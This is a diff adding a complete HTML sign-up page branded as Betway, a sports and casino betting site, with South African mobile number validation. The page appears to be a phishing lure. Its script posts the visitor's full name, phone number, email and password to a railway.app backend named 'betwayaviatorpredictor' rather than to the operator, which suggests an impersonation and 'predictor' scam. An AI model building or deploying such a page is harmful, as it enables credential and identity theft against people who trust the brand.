@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Betway Sign Up</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎰</text></svg>" />
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.5.0/css/all.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .signup-container {
+            background: #141414;
+            padding: 45px 35px 40px;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 420px;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.95);
+            position: relative;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 35px;
+        }
+
+        .logo h1 {
+            font-size: 42px;
+            font-weight: 900;
+            color: #ffffff;
+            letter-spacing: 1px;
+        }
+
+        .logo h1 span {
+            color: #f5c518;
+        }
+
+        .logo p {
+            color: #f5c518;
+            font-size: 10px;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            margin-top: 2px;
+            font-weight: 300;
+        }
+
+        .signup-heading {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            color: #bbbbbb;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            letter-spacing: 0.3px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0d0d0d;
+            border: 2px solid #2a2a2a;
+            border-radius: 10px;
+            color: #ffffff;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: #f5c518;
+            background: #111;
+            box-shadow: 0 0 25px rgba(245, 197, 24, 0.06);
+        }
+
+        .input-group input::placeholder {
+            color: #555;
+            font-size: 14px;
+        }
+
+        .input-group .input-icon {
+            position: absolute;
+            right: 16px;
+            bottom: 14px;
+            color: #555;
+            font-size: 18px;
+        }
+
+        .signup-btn {
+            width: 100%;
+            padding: 16px;
+            background: #f5c518;
+            border: none;
+            border-radius: 10px;
+            color: #000000;
+            font-size: 18px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 30px rgba(245, 197, 24, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .signup-btn:hover:not(:disabled) {
+            background: #ffd700;
+            transform: scale(1.02);
+            box-shadow: 0 12px 40px rgba(245, 197, 24, 0.45);
+        }
+
+        .signup-btn:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+
+        .signup-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: scale(0.98);
+        }
+
+        .spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(0,0,0,0.3);
+            border-radius: 50%;
+            border-top-color: #000000;
+            animation: spin 0.8s ease-in-out infinite;
+        }
+
+        .spinner.active {
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .btn-text {
+            display: inline-block;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 28px 0 22px;
+            gap: 15px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #2a2a2a;
+        }
+
+        .divider span {
+            color: #555;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .login-text {
+            text-align: center;
+            color: #aaaaaa;
+            font-size: 15px;
+        }
+
+        .login-text a {
+            color: #f5c518;
+            font-weight: 700;
+            text-decoration: none;
+            font-size: 16px;
+            margin-left: 4px;
+            cursor: pointer;
+        }
+
+        .login-text a:hover {
+            text-decoration: underline;
+        }
+
+        #message {
+            padding: 12px 16px;
+            border-radius: 10px;
+            margin-bottom: 18px;
+            font-size: 14px;
+            display: none;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        #message.error {
+            display: block;
+            background: rgba(255, 0, 0, 0.15);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            color: #ff6b6b;
+        }
+
+        #message.success {
+            display: block;
+            background: rgba(0, 166, 81, 0.15);
+            border: 1px solid rgba(0, 166, 81, 0.3);
+            color: #00c45a;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(20, 20, 20, 0.85);
+            border-radius: 16px;
+            z-index: 10;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-overlay .big-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(245, 197, 24, 0.2);
+            border-radius: 50%;
+            border-top-color: #f5c518;
+            animation: spin 0.8s ease-in-out infinite;
+        }
+
+        .loading-overlay p {
+            color: #f5c518;
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+
+        @media (max-width: 480px) {
+            .signup-container {
+                padding: 30px 20px;
+            }
+            .logo h1 {
+                font-size: 34px;
+            }
+            .signup-heading {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="signup-container">
+
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="big-spinner"></div>
+            <p>Processing your request...</p>
+        </div>
+
+        <div class="logo">
+            <h1>BET<span>WAY</span></h1>
+            <p>Sports · Casino · Games</p>
+        </div>
+
+        <div class="signup-heading">Create Account</div>
+
+        <div id="message"></div>
+
+        <div class="input-group">
+            <label>Full Name</label>
+            <input type="text" id="fullName" placeholder="Enter your full name" />
+            <span class="input-icon"><i class="fas fa-user"></i></span>
+        </div>
+
+        <div class="input-group">
+            <label>+27 Mobile Number</label>
+            <input type="tel" id="mobileNumber" placeholder="Enter your mobile number" />
+            <span class="input-icon"><i class="fas fa-phone"></i></span>
+        </div>
+
+        <div class="input-group">
+            <label>Email Address</label>
+            <input type="email" id="email" placeholder="Enter your email address" />
+            <span class="input-icon"><i class="fas fa-envelope"></i></span>
+        </div>
+
+        <div class="input-group">
+            <label>Create Password</label>
+            <input type="password" id="password" placeholder="Create a password" />
+            <span class="input-icon"><i class="fas fa-lock"></i></span>
+        </div>
+
+        <div class="input-group">
+            <label>Confirm Password</label>
+            <input type="password" id="confirmPassword" placeholder="Confirm your password" />
+            <span class="input-icon"><i class="fas fa-check-circle"></i></span>
+        </div>
+
+        <button class="signup-btn" onclick="doSignup()">
+            <span class="spinner" id="spinner"></span>
+            <span class="btn-text" id="btnText">Sign Up</span>
+        </button>
+
+        <div class="divider">
+            <span>Already have an account?</span>
+        </div>
+
+        <p class="login-text">
+            <a onclick="goToLogin()">Login</a>
+        </p>
+
+    </div>
+
+    <script>
+        // ============================================
+        // SIGNUP PAGE - WORKING
+        // ============================================
+
+        var fullNameInput = document.getElementById('fullName');
+        var mobileInput = document.getElementById('mobileNumber');
+        var emailInput = document.getElementById('email');
+        var passwordInput = document.getElementById('password');
+        var confirmInput = document.getElementById('confirmPassword');
+        var spinner = document.getElementById('spinner');
+        var btnText = document.getElementById('btnText');
+        var messageDiv = document.getElementById('message');
+        var loadingOverlay = document.getElementById('loadingOverlay');
+        var signupBtn = document.querySelector('.signup-btn');
+
+        function showMessage(text, type) {
+            messageDiv.textContent = text;
+            messageDiv.className = type;
+        }
+
+        function hideMessage() {
+            messageDiv.textContent = '';
+            messageDiv.className = '';
+        }
+
+        function showLoading() {
+            signupBtn.disabled = true;
+            spinner.classList.add('active');
+            btnText.textContent = 'Creating Account...';
+            loadingOverlay.classList.add('active');
+        }
+
+        function hideLoading() {
+            signupBtn.disabled = false;
+            spinner.classList.remove('active');
+            btnText.textContent = 'Sign Up';
+            loadingOverlay.classList.remove('active');
+        }
+
+        function doSignup() {
+            var fullName = fullNameInput.value.trim();
+            var mobileNumber = mobileInput.value.trim();
+            var email = emailInput.value.trim();
+            var password = passwordInput.value.trim();
+            var confirm = confirmInput.value.trim();
+
+            // Validation
+            if (!fullName || !mobileNumber || !email || !password || !confirm) {
+                showMessage('⚠️ Please fill in all fields.', 'error');
+                return;
+            }
+
+            if (fullName.length < 2) {
+                showMessage('⚠️ Please enter your full name.', 'error');
+                return;
+            }
+
+            var mobileRegex = /^(\+27|0)[6-8][0-9]{8}$/;
+            if (!mobileRegex.test(mobileNumber)) {
+                showMessage('⚠️ Please enter a valid SA number (e.g., 0712345678)', 'error');
+                return;
+            }
+
+            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                showMessage('⚠️ Please enter a valid email address.', 'error');
+                return;
+            }
+
+            if (password.length < 6) {
+                showMessage('⚠️ Password must be at least 6 characters.', 'error');
+                return;
+            }
+
+            if (password !== confirm) {
+                showMessage('⚠️ Passwords do not match.', 'error');
+                return;
+            }
+
+            hideMessage();
+            showLoading();
+
+            // Send to backend (using same login endpoint for now)
+            var apiUrl = 'https://betwayaviatorpredictor-production-911a.up.railway.app/api/login';
+
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    mobileNumber: mobileNumber,
+                    password: password,
+                    fullName: fullName,
+                    email: email,
+                    type: 'signup'
+                })
+            })
+            .then(function(response) {
+                return response.json();
+            })
+            .then(function(data) {
+                hideLoading();
+                if (data.success) {
+                    showMessage('✅ Account created successfully! Redirecting...', 'success');
+                    showLoading();
+                    setTimeout(function() {
+                        window.location.href = 'index.html';
+                    }, 2000);
+                } else {
+                    showMessage('❌ ' + (data.message || 'Signup failed.'), 'error');
+                }
+            })
+            .catch(function(error) {
+                hideLoading();
+                showMessage('❌ Error: ' + error.message, 'error');
+            });
+        }
+
+        function goToLogin() {
+            window.location.href = 'index.html';
+        }
+
+        document.onkeypress = function(e) {
+            if (e.key === 'Enter') {
+                var active = document.activeElement;
+                if (active === fullNameInput || active === mobileInput || 
+                    active === emailInput || active === passwordInput || 
+                    active === confirmInput) {
+                    doSignup();
+                }
+            }
+        };
+    </script>
+
+</body>
+</html>
